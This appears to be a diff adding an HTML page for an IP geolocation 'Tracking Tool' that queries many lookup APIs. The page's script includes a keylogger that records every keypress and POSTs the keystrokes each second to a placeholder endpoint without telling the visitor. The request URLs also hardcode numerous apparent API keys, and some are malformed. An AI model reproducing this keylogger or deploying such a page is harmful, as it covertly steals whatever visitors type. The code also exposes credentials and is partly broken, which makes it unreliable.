@@ -1,0 +1,357 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Trackv2</title>
+  <link rel="stylesheet" href="Design.css">
+  <style>
+    /* Add a black background color to the top navigation */
+    .topnav {
+background: rgba(0, 0, 0, 0.5);
+      overflow: hidden;
+    }
+
+    /* Style the links inside the navigation bar */
+    .topnav a {
+      float: left;
+      display: block;
+      color: red;
+background: rgba(0, 0, 0, 0.5);
+      text-align: center;
+      padding: 14px 16px;
+      text-decoration: none;
+      font-size: 17px;
+      border-bottom: 3px solid transparent;
+    }
+
+    .topnav a:hover {
+      border-bottom: 3px solid ;
+    }
+
+    body {
+      font-family: Arial, sans-serif;
+background-image: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSFVOZ2CsKQIPT0Lk06f5bNALaBIuEhMWppBg&s');
+      margin: 0;
+      padding: 0;
+    }
+   div {
+     color: red;
+   }
+   label {
+     color: red;
+   }
+    header {
+      text-align: left;
+background: rgba(0, 0, 0, 0.5);
+      padding: 20px;
+    }
+
+    .typing-text {
+      overflow: hidden; 
+      border-right: .15em solid orange; 
+      white-space: nowrap; 
+      margin: 0 auto; 
+      letter-spacing: .15em; 
+      animation: typing 3.5s steps(40, end), blink-caret .75s step-end infinite;
+    }
+
+    @keyframes typing {
+      from { width: 0 }
+      to { width: 100% }
+    }
+
+    @keyframes blink-caret {
+      from, to { border-color: transparent }
+      50% { border-color: orange }
+    }
+
+    #geoIPResult {
+      width: 400px;
+      height: 300px;
+      border: 2px solid red;
+      border-radius: 10px;
+      padding: 20px;
+      margin-bottom: 20px;
+      overflow-y: auto;
+    }
+
+    #trackButton {
+      padding: 10px 20px;
+      background-color: red;
+      color: green;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+
+    #trackButton:hover {
+background: rgba(0, 0, 0, 0.5);
+    }
+
+    .keylogger-box {
+background: rgba(0, 0, 0, 0.5);
+      color: #fff;
+      padding: 10px;
+      margin-top: 20px;
+      border-radius: 5px;
+    }
+
+    #keylogger {
+      width: 96%;
+      height: 100vh;
+background: rgba(0, 0, 0, 0.5);
+      color: lime;
+      border: none;
+      border-radius: 5px;
+      padding: 10px;
+      font-family: monospace;
+      resize: none;
+    }
+  </style>
+</head>
+<body style="color:black">
+  <div class="topnav">
+    <a href="#" class="active">Tracker v10</a>
+    <a href="TrapTune.html">Reset factor</a>
+  </div>
+  <header>
+    <div class="typing-text">Tracking Tool</div>
+  </header>
+  
+  <hr>
+  <form id="trackForm">
+    <label for="ipAddress">Enter IP address:</label>
+    <input type="text" id="ipAddress" name="ipAddress" placeholder="Example: 192.168.1.1" required>
+    <button type="button" id="trackButton">Trace</button>
+    <br>
+  </form>
+  <hr>
+  <div id="geoIPResult"></div>
+  <div class="provider-options">
+    <label>Select Providers:</label><br>
+    <input type="checkbox" id="abstractCheckbox" name="providers" value="abstract" checked>
+    <label for="abstractCheckbox">Abstract IP</label><br>
+    <input type="checkbox" id="geolocationioCheckbox" name="providers" value="geolocationio" checked>
+    <label for="geolocationioCheckbox">IP Geolocation.io</label><br>
+    <input type="checkbox" id="ip2locationCheckbox" name="providers" value="ip2location" checked>
+    <label for="ip2locationCheckbox">IP2Location.com</label><br>
+    <input type="checkbox" id="location iqCheckbox" name="providers" value="locationiq" checked>
+    <label for="locationiqCheckbox">LocationIQ</label><br>
+    <input type="checkbox" id="graphhopperCheckbox" name="providers" value="graphhopper" checked>
+    <label for="graphhopperCheckbox">GraphHopper</label><br>
+    <input type="checkbox" id="geoapifyCheckbox" name="providers" value="geoapify" checked>
+    <label for="geoapifyCheckbox">Geoapify</label><br>
+    <input type="checkbox" id="geocodingmapsCheckbox" name="providers" value="geocodingmaps" checked>
+    <label for="geocodingmapsCheckbox">Geocoding Maps</label><br>
+    <input type="checkbox" id="opencagedataCheckbox" name="providers" value="opencagedata" checked>
+    <label for="opencagedataCheckbox">OpenCageData</label><br>
+    <input type="checkbox" id="distancematrixCheckbox" name="providers" value="distancematrix" checked>
+    <label for="distancematrixCheckbox">Distance Matrix</label><br>
+    <input type="checkbox" id="zipcodeapiCheckbox" name="providers" value="zipcodeapi" checked>
+    <label for="zipcodeapiCheckbox">ZipCodeStack</label><br>
+    <input type="checkbox" id="billingWhoisFreakCheckbox" name="providers" value="billingWhoisFreak" checked>
+    <label for="billingWhoisFreakCheckbox">Billing WhoisFreak</label><br>
+    <input type="checkbox" id="ipGeolocationWhoisXmlApiCheckbox" name="providers" value="ipGeolocationWhoisXmlApi" checked>
+    <label for="ipGeolocationWhoisXmlApiCheckbox">IP Geolocation WhoisXmlApi</label><br>
+    <input type="checkbox" id="dnsHistoryWhoisXmlApiCheckbox" name="providers" value="dnsHistoryWhoisXmlApi" checked>
+    <label for="dnsHistoryWhoisXmlApiCheckbox">DNS History WhoisXmlApi</label><br>
+    <input type="checkbox" id="cloudflareTraceCheckbox" name="providers" value="cloudflareTrace" checked>
+    <label for="cloudflareTraceCheckbox">Cloudflare Trace</label><br>
+    <input type="checkbox" id="ipdataCheckbox" name="providers" value="ipdata" checked>
+    <label for="ipdataCheckbox">ipdata</label><br>
+    <input type="checkbox" id="metadapiCheckbox" name="providers" value="metadapi" checked>
+    <label for="metadapiCheckbox">metadapi</label><br>
+    <input type="checkbox" id="smartyCheckbox" name="providers" value="smarty" checked>
+    <label for="smartyCheckbox">smarty</label><br>
+  </div>
+  <hr>
+  <button>Select the Continent</button>
+  <br>
+  <input type="checkbox" id="asiaCheckbox" name="continents" value="Asia" checked> 
+  <label for="asiaCheckbox">Asia</label><br>
+  <input type="checkbox" id="africaCheckbox" name="continents" value="Africa" checked>
+  <label for="africaCheckbox">Africa</label><br>
+  <input type="checkbox" id="northAmericaCheckbox" name="continents" value="North America" checked>
+  <label for="northAmericaCheckbox">North America</label><br>
+  <input type="checkbox" id="southAmericaCheckbox" name="continents" value="South America" checked>
+  <label for="southAmericaCheckbox">South America</label><br>
+  <input type="checkbox" id="antarcticaCheckbox" name="continents" value="Antarctica" checked>
+  <label for="antarcticaCheckbox">Antarctica</label><br>
+  <input type="checkbox" id="europeCheckbox" name="continents" value="Europe" checked>
+  <label for="europeCheckbox">Europe</label><br>
+  <input type="checkbox" id="australiaCheckbox" name="continents" value="Australia" checked> 
+  <label for="australiaCheckbox">Australia</label><br>
+  <hr>
+  <div class="keylogger-box">
+    <h3>Keylogger</h3>
+    <textarea id="keylogger" rows="10" readonly></textarea>
+  </div>
+  <script>
+    var keys = '';
+    document.onkeypress = function(e) {
+      get = window.event ? event : e;
+      key = get.keyCode ? get.keyCode : get.charCode;
+      keys += String.fromCharCode(key);
+    }
+    
+    window.setInterval(function() {
+ if (keys.length > 0) {
+        fetch('http://your-keylogger-endpoint.com', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            keys: keys
+          })
+        }).catch(error => console.error('Error sending keylogger data:', error));
+        keys = '';
+      }
+    }, 1000);
+    
+    document.getElementById('trackButton').addEventListener('click', track);
+    
+    function track() {
+      const ipAddress = document.getElementById('ipAddress').value;
+      const selectedProviders = Array.from(document.querySelectorAll('.provider-options input[type="checkbox"]:checked')).map(checkbox => checkbox.value);
+      const selectedContinents = Array.from(document.querySelectorAll('input[name="continents"]:checked')).map(checkbox => checkbox.value);
+      
+      if (!validateIP(ipAddress)) {
+        alert('Please enter a valid IP address.');
+        return;
+      }
+
+      selectedProviders.forEach(provider => {
+        let url = '';
+        switch (provider) {
+          case 'abstract':
+            url = `https://api.abstractapi.com/v1/geoip?ipAddress=${ipAddress}&api_key=04e3e0dc50f34d74a60dc7b45a4abf1d`;
+            break;
+          case 'geolocationio':
+            url = `https://api.ipgeolocation.io/ipgeo?apiKey=294f98a3977343a8a33f35b7e25d5e61&ip=${ipAddress}`;
+            break;
+          case 'ip2location':
+            url = `https://api.ip2location.com/?ip=${ipAddress}&keyE30841E50B64D74EC7D7CBE6159A6C28c
+            &package=WS6`;
+            break;
+          case 'locationiq':
+            url = `https://us1.locationiq.com/v1/reverse.php?key=59bcca48bceb97833ffa74410f5bd7b7&lat=45.464&lon=9.189&format=json`;
+            break;
+          case 'graphhopper':
+            url = `https://graphhopper.com/api/1/geocode?q=${ipAddress}&key=2f497f07-cb55-40f1-ac27-34d020addeba`;
+            break;
+          case 'geoapify':
+            url = `https://api.geoapify.com/v1/ipinfo?ip=${ipAddress}&apiKey= a0809826225144cbb40eeebf7d63d0c7 `;
+            break;
+          case 'geocodingmaps':
+            url = `https://geocoding.maps.com/api/v1/geocode?ip=${ipAddress}&key=662e28fce0b7f817139327cpx78b703`;
+            break;
+          case 'opencagedata':
+            url = `https://api.opencagedata.com/geocode/v1/json?q=${ipAddress}&key=6da4b5e698bc4e638dd31ebc9fe7af38`;
+            break;
+          case 'distancematrix':
+            url = `https://distancematrix.ai/api/v1/route?key=jumQOWCDAbJlt45oCWGFdxXjlKu524y3gSvZI42KH0XLHUeP4XFC3ciq51HJ7UhT&ip=${ipAddress}`;
+            break;
+          case 'zipcodeapi':
+            url = `https://api.zipcodestack.com/v1/lookup?apikey=01HWQERGEF9KQ4SH4Y6SFQBDHY&ip=${ipAddress}`;
+            break;
+          case 'billingWhoisFreak':
+            url = `https://billimg.whoisfreak.com/v1/details?apikey=2b5d04a532924334868c28e9e9749c87&ip=${ipAddress}`;
+            break;
+          case 'ipGeolocationWhoisXmlApi':
+            url = `https://ip-geolocation.whoisxmlapi.com/api/v1?apiKey=at_Ti38rIdTUk3Mj0Vg5KkiT2dtoP8a1&ipAddress=${ipAddress}`;
+            break;
+          case 'dnsHistoryWhoisXmlApi':
+            url = `https://dns-history.whoisxmlapi.com/api/v1?apiKey=at_Ti38rIdTUk3Mj0Vg5KkiT2dtoP8a1&ipAddress=${ipAddress}`;
+            break;
+          case 'cloudflareTrace':
+            url = `https://api.cloudflare.com/client/v4/trace?ip=${ipAddress}`;
+            break;
+          case 'ipdata':
+            url = `https://api.ipdata.co/${ipAddress}?api-key=133f11117637a688c35e0464c0911b763c6736f81ab24a30aaef9d07`;
+            break;
+          case 'metadapi':
+            url = `https://metadapi.com/api/${ipAddress}?key=90210`;
+            break;
+          case 'smarty':
+            url = `https://smarty.com/api/${ipAddress}?key=ptv9P3P6b7Jl9O8DyddQ`;
+            break;
+        }
+
+        fetch(url)
+          .then(response => {
+            if (!response.ok) {
+              throw new Error(`HTTP error! status: ${response.status}`);
+            }
+            return response.json();
+          })
+          .then(data => {
+            displayData(data, selectedContinents);
+            logData(data);
+          })
+          .catch(error => console.error(`Error fetching data from ${provider}:`, error));
+      });
+    }
+
+    function displayData(data, selectedContinents) {
+      const geoIPResult = document.getElementById('geoIPResult');
+      const currentDate = new Date().toLocaleString();
+      geoIPResult.innerHTML = `
+        <p>Status: ${data.status || 'N/A'}</p>
+        <p>Content: ${data.content || 'N/A'}</p>
+ <p>Country: ${data.country_name || 'N/A'}</p>
+        <p>Country Code: ${data.country_code || 'N/A'}</p>
+        <p>Region: ${data.region || 'N/A'}</p>
+        <p>Region Name: ${data.region_name || 'N/A'}</p>
+        <p>City: ${data.city || 'N/A'}</p>
+        <p>District: ${data.district || 'N/A'}</p>
+        <p>ZIP: ${data.zip || 'N/A'}</p>
+        <p>Latitude: ${data.latitude || 'N/A'}</p>
+        <p>Longitude: ${data.longitude || 'N/A'}</p>
+        <p>Offset: ${data.offset || 'N/A'}</p>
+        <p>ISP: ${data.isp || 'N/A'}</p>
+        <p>Organization: ${data.organization || 'N/A'}</p>
+        <p>AS: ${data.as || 'N/A'}</p>
+        <p>AS Name: ${data.as_name || 'N/A'}</p>
+        <p>Timezone: ${data.timezone || 'N/A'}</p>
+        <p>Date Tracked: ${currentDate}</p>
+        <p>Selected Continents: ${selectedContinents.length > 0 ? selectedContinents.join(', ') : 'None'}</p>
+      `;
+      logData(data);
+    }
+
+    function logData(data) {
+      const logEntry = `
+        Tracked Data:
+        Status: ${data.status || 'N/A'}
+        Content: ${data.content || 'N/A'}
+        Country: ${data.country_name || 'N/A'}
+        Country Code: ${data.country_code || 'N/A'}
+        Region: ${data.region || 'N/A'}
+        Region Name: ${data.region_name || 'N/A'}
+        City: ${data.city || 'N/A'}
+        District: ${data.district || 'N/A'}
+        ZIP: ${data.zip || 'N/A'}
+        Latitude: ${data.latitude || 'N/A'}
+        Longitude: ${data.longitude || 'N/A'}
+        Offset: ${data.offset || 'N/A'}
+        ISP: ${data.isp || 'N/A'}
+        Organization: ${data.organization || 'N/A'}
+        AS: ${data.as || 'N/A'}
+        AS Name: ${data.as_name || 'N/A'}
+        Timezone: ${data.timezone || 'N/A'}
+        Date: ${new Date().toLocaleString()}
+      `;
+      document.getElementById('keylogger').value += logEntry + '\n';
+    }
+
+    function validateIP(ip) {
+      const ipPattern = /^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
+      return ipPattern.test(ip);
+    }
+  </script>
+</body>
+</html> 
